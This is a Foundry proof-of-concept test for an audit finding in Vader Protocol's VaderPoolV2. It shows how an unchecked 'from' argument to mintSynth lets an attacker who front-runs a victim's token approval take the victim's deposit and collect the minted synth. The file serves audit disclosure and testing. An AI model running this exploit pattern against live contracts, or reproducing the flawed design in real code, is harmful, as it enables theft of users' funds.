// SPDX-License-Identifier: MIT
pragma solidity =0.8.9;

// Real audited Vader Protocol source (Code4rena 2021-11, commit on default branch).
// H-13 (#42335): VaderPoolV2.mintSynth() takes an arbitrary `from` and pulls the
// native deposit via safeTransferFrom(from, ...). Any account can front-run a
// victim's approval, calling mintSynth with from=victim and to=attacker, stealing
// the victim's native deposit and receiving the minted synth for free.
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../src/vader/contracts/dex-v2/pool/VaderPoolV2.sol";
import "../src/vader/contracts/dex-v2/synths/SynthFactory.sol";
import "../src/vader/contracts/dex-v2/synths/Synth.sol";
import "../src/vader/contracts/dex-v2/wrapper/LPWrapper.sol";
import "../src/vader/contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "../src/vader/contracts/interfaces/dex-v2/synth/ISynthFactory.sol";

/// @notice Minimal real ERC20 used only as the opaque native / foreign tokens the
/// pool treats as external assets. The audited pool, synth factory, synth, LP wrapper
/// and LP token below are the REAL unmodified Vader source.
contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PoC_42335 is Test {
    TestToken nativeAsset;
    TestToken foreignAsset;
    VaderPoolV2 pool;
    SynthFactory factory;
    LPWrapper wrapper;

    address seeder = address(0x5EED);
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        nativeAsset = new TestToken("Vader", "VADER");
        foreignAsset = new TestToken("USD Coin", "USDC");

        // Real Vader dex-v2 deployment.
        pool = new VaderPoolV2(false, IERC20(address(nativeAsset)));
        factory = new SynthFactory(address(pool));
        wrapper = new LPWrapper(address(pool));
        pool.initialize(ILPWrapper(address(wrapper)), ISynthFactory(address(factory)), address(this));
        pool.setTokenSupport(IERC20(address(foreignAsset)), true);
        pool.setFungibleTokenSupport(IERC20(address(foreignAsset)));

        // A legitimate LP seeds the pair through the REAL mintFungible path so the
        // synth pricing reserves are non-zero (attacker then mints a real synth amount).
        nativeAsset.mint(seeder, 100 ether);
        foreignAsset.mint(seeder, 100 ether);
        vm.startPrank(seeder);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        pool.mintFungible(IERC20(address(foreignAsset)), 100 ether, 100 ether, seeder, seeder);
        vm.stopPrank();

        // Victim approves the pool intending to mint a synth for themselves later.
        nativeAsset.mint(victim, 10 ether);
        vm.prank(victim);
        nativeAsset.approve(address(pool), type(uint256).max);
    }

    function test_attacker_steals_victim_deposit_and_mints_synth_to_self() public {
        uint256 victimNativeBefore = nativeAsset.balanceOf(victim); // 10 ether

        // Attacker front-runs the victim: from = victim, to = attacker.
        vm.prank(attacker);
        uint256 minted = pool.mintSynth(IERC20(address(foreignAsset)), 10 ether, victim, attacker);

        Synth synth = Synth(address(factory.synths(IERC20(address(foreignAsset)))));

        // Concrete harm:
        // 1. Victim lost their entire 10 VADER native deposit.
        assertEq(nativeAsset.balanceOf(victim), victimNativeBefore - 10 ether, "victim native not drained");
        assertEq(nativeAsset.balanceOf(victim), 0, "victim should have 0 native left");
        // 2. Attacker received all of the minted synths; victim received none.
        assertGt(minted, 0, "no synth minted");
        assertEq(IERC20(address(synth)).balanceOf(attacker), minted, "attacker did not receive synth");
        assertEq(IERC20(address(synth)).balanceOf(victim), 0, "victim received synth");
        // 3. The stolen native is now sitting in the pool.
        assertEq(nativeAsset.balanceOf(address(pool)), 110 ether, "pool did not absorb stolen native");

        emit log_named_uint("victim native stolen (wei)", 10 ether);
        emit log_named_uint("synth minted to attacker (wei)", minted);
    }
}
